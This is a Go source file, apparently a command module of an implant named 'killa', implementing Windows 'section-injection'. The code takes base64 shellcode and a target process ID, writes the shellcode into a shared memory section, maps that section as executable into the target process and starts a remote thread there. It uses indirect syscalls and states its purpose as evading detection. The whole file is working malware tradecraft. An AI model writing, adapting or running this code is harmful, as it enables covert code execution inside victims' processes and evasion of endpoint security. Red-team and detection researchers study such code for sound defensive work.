//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"killa/pkg/structs"
)

const (
	SECTION_ALL_ACCESS = 0xF001F // STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE
	SEC_COMMIT         = 0x08000000

	ViewUnmap = 2 // For InheritDisposition
)

// SectionInjectionCommand implements the section-injection command
type SectionInjectionCommand struct{}

// Name returns the command name
func (c *SectionInjectionCommand) Name() string {
	return "section-injection"
}

// Description returns the command description
func (c *SectionInjectionCommand) Description() string {
	return "Perform section injection using NtCreateSection, NtMapViewOfSection, and NtCreateThreadEx to evade direct memory writing"
}

// SectionInjectionParams represents the parameters for section-injection
type SectionInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	PID          int    `json:"pid"`           // Target process ID
}

// Execute executes the section-injection command
func (c *SectionInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	var params SectionInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: No shellcode data provided")
	}

	if params.PID <= 0 {
		return errorResult("Error: Invalid PID specified")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output, err := performSectionInjection(shellcode, params.PID)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
	}

	return successResult(output)
}

func performSectionInjection(shellcode []byte, pid int) (string, error) {
	var sb strings.Builder

	sb.WriteString("[*] Section Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))

	if !IndirectSyscallsAvailable() {
		return sb.String(), fmt.Errorf("this technique requires indirect syscalls, which are not available")
	}
	sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")

	// 1. Create a section
	var hSection uintptr
	maxSize := uintptr(len(shellcode))
	status := IndirectNtCreateSection(&hSection, SECTION_ALL_ACCESS, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtCreateSection failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hSection)
	sb.WriteString(fmt.Sprintf("[+] NtCreateSection handle: 0x%X\n", hSection))

	// 2. Map view into local process (RW)
	// We pass -1 (0xFFFFFFFFFFFFFFFF) as the process handle for the current process
	currentProcess := ^uintptr(0) // -1
	var localBaseAddress uintptr
	var localViewSize uintptr
	status = IndirectNtMapViewOfSection(hSection, currentProcess, &localBaseAddress, &localViewSize, ViewUnmap, PAGE_READWRITE)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtMapViewOfSection (local) failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped local view (RW) at: 0x%X\n", localBaseAddress))

	// 3. Write shellcode to the local mapped section
	localSlice := unsafe.Slice((*byte)(unsafe.Pointer(localBaseAddress)), len(shellcode))
	copy(localSlice, shellcode)
	sb.WriteString(fmt.Sprintf("[+] Copied %d bytes to local mapped section\n", len(shellcode)))

	// 4. Open remote process
	var hProcess uintptr
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	status = IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
	if status != 0 {
		return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess))

	// 5. Map view into remote process (RX)
	var remoteBaseAddress uintptr
	var remoteViewSize uintptr
	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBaseAddress, &remoteViewSize, ViewUnmap, PAGE_EXECUTE_READ)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtMapViewOfSection (remote) failed: NTSTATUS 0x%X", status)
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped remote view (RX) at: 0x%X\n", remoteBaseAddress))

	// 6. Unmap local view (we don't need it anymore, and helps stay clean)
	status = IndirectNtUnmapViewOfSection(currentProcess, localBaseAddress)
	if status != 0 {
		sb.WriteString(fmt.Sprintf("[!] Warning: NtUnmapViewOfSection (local) failed: NTSTATUS 0x%X\n", status))
	} else {
		sb.WriteString("[+] Unmapped local view\n")
	}

	// 7. Execute via Thread
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBaseAddress)
	if status != 0 {
		return sb.String(), fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%X", status)
	}
	defer IndirectNtClose(hThread)
	sb.WriteString(fmt.Sprintf("[+] Created remote thread (handle: 0x%X)\n", hThread))

	sb.WriteString("[+] Section injection completed successfully\n")

	return sb.String(), nil
}
